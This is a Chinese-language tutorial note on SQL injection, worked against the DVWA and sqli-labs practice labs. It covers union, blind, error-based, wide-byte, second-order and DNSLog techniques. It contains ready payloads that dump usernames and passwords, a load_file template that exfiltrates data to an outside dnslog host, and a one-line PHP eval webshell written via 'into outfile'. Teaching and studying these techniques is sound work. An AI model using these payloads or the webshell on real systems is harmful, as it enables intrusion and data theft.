---
title: SQL 注入基础
date: 2025-01-12
tags:
  - SQL注入
categories:
  - 安全相关
description: SQL 注入基础
---
# SQL 注入基础

SQL 注入是由于程序没有对用户输入数据的合法性进行验证和过滤，导致 SQL 查询语句被恶意拼接从而产生的漏洞。**代码中执行的 SQL 语句存在可控变量导致；**

危害：
1. 获取敏感数据：获取网站管理员账号、密码等；
2. 绕过登录验证：使用万能密码登录网站后台等；
3. 文件系统操作：列目录，读取、写入文件等；
4. 注入表操作：读取、写入、删除注册表等；
5. 执行系统命令：远程执行命令。

分类：
1. 根据注入位置分类：GET 注入、POST 注入、Head 头注入；
2. 根据反馈结果分类：有回显（报错注入）、无回显（盲注）；
3. 根据数据类型分类：
	- 字符型注入（需要引号闭合）
	- 数字型（不需要引号闭合）
4. 二次注入；
5. 数据库不同来分类

以 DVWA 和 sqli-labs 靶场为示例，PHP 和 MySQL 数据库；

（靶场报错 `Illegal mix of collations for operation 'UNION'` ；将 `DVWA\dvwa\includes\DBMS\MySQL.php` 中第 28 行修改为`$create_db = "CREATE DATABASE {$_DVWA[ 'db_database' ]} COLLATE utf8_general_ci;";` 点击 DVWA 页面的创建数据库按钮重新创建数据库）

# `union`联合查询注入

`union` 操作符用于合并两个或多个 `select` 语句的结果集，`union` 结果集中的列名总是等于 `union` 中第一个 `select` 语句中的列名，并且 `union` 内部的 `select` 语句必须拥有相同数量的列。列也必须拥有相似的数据类型。同时，每条 `select` 语句中的列的顺序必须相同。

这里主要利用该关键字可以追加一条或多条额外的`select`查询，并将结果追加到原始查询中。联合查询会“纵向”拼接两个或多个 `select` 语句的结果。

## 判断是否存在注入

- 一般利用`'`或`"`来判断是否存在漏洞，如果出现一些非正常的提示信息；
	- 可通过提交的信息及网页来猜测原本的 SQL 注入语句（如 URL / 数据包中的一些字段等）；
		- 例如：这里输入 1 ,对应的 URL 是`……/sqli/?id=1`

![[attachments/Pasted image 20250312105334.png]]

```sql
# SQL语句
select first_name, last_name from users where user_id = '$id'

# 输入1
select first_name, last_name from users where user_id = '1'

# 输入1' -> 报错，说明该查询语句对原查询语句进行了修改
select first_name, last_name from users where user_id = '1''
```

## 判断注入类型

判断是数字型还是字符型，及注入的时候是否需要添加引号，一般使用：`1 and 1=1`、`1 and 1=2`和`1' and '1'='1`、`1' and '1'='2`进行判断。

输入 `1 and 1=1`、`1 and 1=2` 都显示正常；输入 `1' and '1'='1`、`1' and '1'='2` 前者正常，后者不显示，说明单引号起了作用，可以判断注入类型为字符型；

![[attachments/Pasted image 20250312111454.png]]

> MySQL 中是隐式类型，所以：`'2admin' ==> 2`、`'33admin' ==> 33`；

## 判断表中列数

`order by`根据指定的列对结果集进行排序；排序的数字大于当前列则会报错；

![[attachments/Pasted image 20250312112926.png]]

这里排 2 正常回显，3 则报错，可以判断该表只有两列；

> 注意 URL 编码；

## 确定显示位

服务端执行 SQL 语句后，数据显示在客户端页面上，这里需要判断主要回显的位置在哪里；

![[attachments/Pasted image 20250312203826.png]]

> 实战中一般不查询 union 左边的内容，程序在展示数据的时候通常只会取结果集的第一行数据，所以只要让第一行查询的结果为空集；因此一般将左边的查询修改为负数或较大的数字。

## 获取数据

获取数据库名、表名、字段名及表中记录等数据；

```sql
-1' union select 1,table_name from information_schema.tables where table_schema='dvwa'%23

-1' union select 1,column_name from information_schema.columns where table_name='guestbook' and table_schema='dvwa'%23

-1' union select 1,comment from guestbook%23

-1' union select 1,group_concat(comment_id,comment,name) from guestbook%23
```

> 注：由于各字段的排序规则不同，会导致 union 联合查询失败；

# 盲注

SQL 语句执行后，在前端页面得不到回显，此时就需要通过一些方法来判断是否存在盲注；

## 布尔盲注

页面正确执行了构造的 SQL 语句，和执行了错误的 SQL 语句返回两种不同的页面，来判断是否存在注入及 SQL 语句正确性。

一般的注入流程：

- 判断是否存在注入；
	- 判断方式和上面的差不多；
- 获取/猜解数据库、表名、列名、数据长度；
- 逐字猜解数据库名、表名、列名、数据；

分别输入`1' and '1'='1`和`1' and '1'='2`执行回显不同，可以说明构造的 SQL 语句生效；

利用`length()`来判断长度，修改判断的条件直到得到正确的回显；

![[attachments/Pasted image 20250313161854.png]]

`substr()`来依次判断数据库名；

![[attachments/Pasted image 20250313162025.png]]

无法查看有多少个表，为避免无效查询，先获取表的数量；`count()`统计数据表中包含的记录行的总数，或根据查询结果返回列中包含的数据行；

![[attachments/Pasted image 20250313162535.png]]

获取表名长度；

![[attachments/Pasted image 20250313162918.png]]

获取具体的表名；

![[attachments/Pasted image 20250313164111.png]]

获取字段名；

列数；

![[attachments/Pasted image 20250313164437.png]]

列名长；

![[attachments/Pasted image 20250313164846.png]]

列名；

![[attachments/Pasted image 20250313164948.png]]

具体数据记录长度；

![[attachments/Pasted image 20250313165227.png]]

具体数据；

![[attachments/Pasted image 20250313165422.png]]

这些操作都是通过一步步猜解观察回显来得到数据；当然也可以用爆破来加快速度；

```sql
# 部分pyload
?id=

1' and length(database())>4%23

1' and substr(database(),1,1)='d'%23

1' and (select count(table_name) from information_schema.tables where table_schema='dvwa')=2

1' and length((select table_name from information_schema.tables where table_schema=database() limit 0,1))=9%23

1' and substr((select table_name from information_schema.tables where table_schema=database() limit 0,1),1,1)='g'%23


1' and (select count(column_name) from information_schema.columns where table_name='guestbook' and table_schema='dvwa')=3%23

1' and length((select column_name from information_schema.columns where table_name='guestbook' and table_schema='dvwa' limit 0,1))=10%23

1' and substr((select column_name from information_schema.columns where table_name='guestbook' and table_schema='dvwa' limit 0,1),1,1)='c'%23

1' and (select length(comment_id) from guestbook limit 0,1)=1%23

1' and substr((select comment_id from guestbook limit 0,1),1,1)='1'%23
```

## 时间盲注

在页面不论输入什么，数据交互玩后都没有回显，此时可以利用页面响应时间来判断 SQL 语句是否在目标中执行；

基本流程和上面的都大差不差；这里以 sqli-labs-Less-9 为例；

判断是否存在时间盲注；

![[attachments/Pasted image 20250313172732.png]]

判断数据库名长度；

![[attachments/Pasted image 20250313172916.png]]

猜测数据库名；

![[attachments/Pasted image 20250313173129.png]]

基本流程和上方的一样；

```sql
# 部分pyload
?id=

1' and sleep(5)%23

1' and if(length(database())=8,sleep(3),1)%23

1' and if(substr(database(),1,1)='s',sleep(3),1)%23

1' and if((select count(table_name) from information_schema.tables where
table_schema='security')=4,sleep(3),1)%23
```

## 报错注入

页面无显示位，但会输出 SQL 语句执行错误的信息，利用这一机制，人为的制造错误条件使查询结果出现在错误信息中。

- 原理：开发人员在开发程序时使用了`print_r()`、`mysql_error()`、`mysqli_connect_error()`函数将 mysql 错误信息输出到前端导致。
- 利用一些可能会报错并输出回显的函数来实现；

以 sqli-labs-Less-5 作为示例；

依旧是用上面所提到的方式来判断是否存在注入；

获取数据库名；

![[attachments/Pasted image 20250313204120.png]]

获取数据表名；

![[attachments/Pasted image 20250313204612.png]]

```sql
# 部分pyload
?id=

1' and updatexml(1,concat(0x7e,database()),1)%23

1' and updatexml(1,concat(0x7e,(select group_concat(table_name) from information_schema.tables where table_schema='security')),1)%23

updatexml(1,concat(0x7e,substr((select group_concat(table_name) from information_schema.tables where table_schema='security'),1,32)),1)%23

1' and updatexml(1,concat(0x7e,(select group_concat(column_name) from information_schema.columns where table_name='emails' and table_schema='security')),1)%23

1' and updatexml(1,concat(0x7e,(select group_concat(column_name) from information_schema.columns where table_name='users' and table_schema='security')),1)%23

1' and updatexml(1,concat(0x7e,(select group_concat(id,username,password) from users)),1)%23

1' and updatexml(1,concat(0x7e,substr((select group_concat(id,username,password) from users),32,32)),1)%23
```

# 宽字节注入

若一个字符大小是一个字节为窄字节；两个字节则为宽字节。像 GB2321、GBK、GB18030、BIG5、Shift_JIS 等这些编码都是常说的宽字节，也就是只有两个字节。英文默认占一个字节，中文占两个字节。

- 原理：数据库对一些特殊字符进行了转义，且使用宽字节（GBK）编码，认为两个字符是一个汉字（前一个 ascii 码要大于 128（比如 `%df` ），才到汉字的范围），而且当我们输入`'`时，MySQL 调用转义函数，将单引号变为`\'`，其中`\`的十六进制是`5c`，MySQL 的 GBK 编码，会认为`%df%5c`是一个宽字节，即`運`，从而使单引号闭合（逃逸），进行注入攻击。

判断是否存在，靶场将他很明显的回显出来，当然实战不会这么明显；

![[attachments/Pasted image 20250313214139.png]]

输入`1%df'`，转义函数将`'`转变为`\'`，此时`%df%5c`进行结合变为一个汉字`運`；

后面的流程和之前的都差不多；

获取表名，这里的`0x64767761`为 dvwa 的 16 进制；

![[attachments/Pasted image 20250313215006.png]]

# 堆叠注入

如 php用 `mysqli_multi_query` 函数来执行 SQL 语句；则再进行注入时可同时执行多条 SQL 语句；

# 二次注入

![[attachments/Pasted image 20250316150721.png]]

eg：注册时写入 payload ，在随后的登录修改等操作，触发条件；

注册用户名：`admin'#1`（在注册时对用户名校验不严格，或是仅对用户的注册阶段进行了过滤，而在修改密码部分却未进行严格的过滤）

更新密码的语句：

```sql
UPDATE users SET PASSWORD='$pass' where username='$username' and password='$curr_pass'
```

利用注册的用户名修改 admin 用户密码：

```sql
UPDATE users SET PASSWORD='$pass' where username='admin'# and password='$curr_pass'
```

- 黑盒思路：分析功能有添加后对数据操作的地方（功能点）
- 白盒思路：insert 后进入 select 或 update 的功能的代码块
- 注入条件：插入时有转义函数或配置，后续有利用插入的数据

# DNSLog 注入

DNS 域名解析，将域名解析到 IP 地址；DNSlog 即存储在 DNS 上的域名相关信息日志文件；

- 原理：ping 命令时会用到 DNS 解析，首先获取一个 dnslog 地址，执行 `ping %username%.znx4mu.dnslog.cn`，此时解析的日志会把`%username%`值给带出来，系统在 ping 之前会将`%username%`的值解析然后再与请求地址拼接起来，一起发给 DNS 服务器，该记录则被记录下来；

![[attachments/Pasted image 20250314110837.png]]

![[attachments/Pasted image 20250314110924.png]]

- 应用场景：报错注入（有回显点），盲注（注入效率低且高线程易被 waf 拦截）；

- 前提条件：
	- 数据库 root 权限；
	- 数据库可读写权限，`secure_file_priv`值为空；
	- windows 系统（读取远程文件用到 UNC 路径，UNC 路径是类似`\\softer`这样形式的网络路径，即`\\`。Linux 服务器没有 UNC 路径；
		> UNC eg：`\\xclay.net\share\张三\账单.docs`，访问这个 UNC 路径，则会得到 xclay.net 服务器的 share 共享文件夹下的 张三 文件夹下的 账单.docs 文件；
		
示例：

这里用到`load_file(filename)`函数，读取一个文件并将其内容作为字符串返回；如果 filename 是 UNC 路径中主机的地址，将会进行域名解析并留下记录，通过查看 DNS 解析记录来达到有回显的目的；

注入语法：`select load_file(concat('//',(数据库语句),'.dnslog地址/abc'))`

![[attachments/Pasted image 20250314114418.png]]

![[attachments/Pasted image 20250314114443.png]]

后续操作基本和上面的一样，修改数据库语法即可；

> [Dnslog在SQL注入中的实战](https://www.anquanke.com/post/id/98096)

> DNSLog平台：
> 
> http://www.dnslog.cn/
> 
> https://www.callback.red/
> 
> http://ceye.io/

# SQL 注入对文件的操作

常用数据库一些操作文件的函数来读取敏感文件或写入 websehll，常用函数：

`into dumpfile()`、`into outfile()`、`load_file()`

```sql
union select 1,'<?php eval($_REQUEST[cmd]?>'into outfile 'c:/phpstudy/www/1.php'
```

> 条件：mysql 配置文件 需要设置 `secure_file_priv` 参数的值；若为空则可指定任意目录，若有对应的路径则只能在指定路径下，若为 null 则禁止导入导出功能。

# 防护

- 转义函数转义特殊字符`addslashes`、`mysql_real_escape_string`、`mysql_escape_string`等；
- 配置文件设置（PHP中`magic_quote_gpc`，高版本已移除该功能）；

> 参考学习：
> https://www.sqlsec.com/2020/05/sqlilabs.html
> 
> https://www.sqlsec.com/2020/11/mysql.html
> 
> https://blog.csdn.net/qq_39291229/article/details/126750798
> 
> https://mp.weixin.qq.com/s/f3KMd2zk7y3AXIQlHtS3tg
> 
> https://blog.csdn.net/rumil/article/details/132392528

[[SQL 注入补充]]


